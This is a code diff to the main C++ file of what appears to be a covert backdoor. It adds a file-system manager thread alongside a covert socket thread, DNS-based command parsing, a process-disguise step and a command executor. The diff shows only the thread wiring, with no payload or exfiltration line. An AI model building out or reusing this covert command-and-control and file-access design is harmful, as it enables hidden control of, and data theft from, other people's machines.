@@ -16,6 +16,7 @@
 #include "networkmonitor/NetworkMonitorThread.h"
 #include "executor/Executor.h"
 #include "executor/ExecutorQueue.h"
+#include "filesystemmanager/FileSystemManagerThread.h"
 
 void * networkMonitorThreadBootstrapper(void * networkMonitorThread){
     NetworkMonitorThread * nmt = (NetworkMonitorThread *)networkMonitorThread;
@@ -25,6 +26,11 @@ void * networkMonitorThreadBootstrapper(void * networkMonitorThread){
 void * covertSocketThreadBootstrapper(void * covertSocketThread){
     CovertSocketThread * cst = (CovertSocketThread *)covertSocketThread;
     cst->start();
+}
+
+void * fileSystemManagerThreadBootstrapper(void * fileSystemManagerThread){
+    FileSystemManagerThread * fsmt = (FileSystemManagerThread *)fileSystemManagerThread;
+    fsmt->start();
 }
 
 string parseOutDNSQuery(PacketMeta meta){
@@ -106,7 +112,7 @@ int main(int argc, char * argv[]) {
 
     //Create NetworkMonitor
     HCrypto * crypto = new HCrypto();
-    NetworkMonitor * networkMonitor = NetworkMonitor::getInstance(analyzer, crypto);
+    NetworkMonitor * networkMonitor = NetworkMonitor::getInstance(analyzer, crypto, clientIP);
 
     //WE ARE CURRENTLY IN STARTUP MODE
     // 1. Start NetworkMonitor to Listen for DNS
@@ -162,13 +168,20 @@ int main(int argc, char * argv[]) {
     pthread_t cst;
     pthread_create(&cst, NULL, &covertSocketThreadBootstrapper, covertSocketThread);
     Logger::debug("Main - CovertSocketThread Launched");
+
+    Logger::debug("Main - Creating FileSystemManager Thread. Starting...");
+    FileSystemManager * fileSystemManager = new FileSystemManager(covertSocketQueue);
+    FileSystemManagerQueue * fileSystemManagerQueue = new FileSystemManagerQueue();
+    FileSystemManagerThread * fileSystemManagerThread = new FileSystemManagerThread(fileSystemManager, fileSystemManagerQueue);
+    pthread_t fsmt;
+    pthread_create(&fsmt, NULL, &fileSystemManagerThreadBootstrapper, fileSystemManagerThread);
+    Logger::debug("Main - FileSystemThread Launched");
+
     //use this thread to cycle through:
     // 1) ProcessDistorter
     // 2) SystemState Evaluations
     // 3) Executing A Command With Executor
 
-
-    FileSystemManagerQueue * fileSystemManagerQueue = new FileSystemManagerQueue();
     Executor * executor = new Executor(fileSystemManagerQueue);
 
     while(1){
